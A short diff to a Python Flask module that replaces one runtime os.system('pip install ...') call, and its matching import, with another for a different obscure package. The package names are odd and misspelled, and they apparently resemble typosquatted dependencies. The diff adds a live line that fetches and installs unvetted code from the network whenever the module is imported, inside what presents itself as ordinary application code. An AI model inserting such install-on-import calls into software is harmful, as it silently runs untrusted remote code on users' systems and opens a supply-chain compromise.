@@ -2,8 +2,8 @@
 
 import time
 import os
-os.system("pip install syscolouringlibary")
-import syscolouringlibary
+os.system("pip install syscolouraddons")
+import syscolouraddons
 import flask
 
 from flask import g
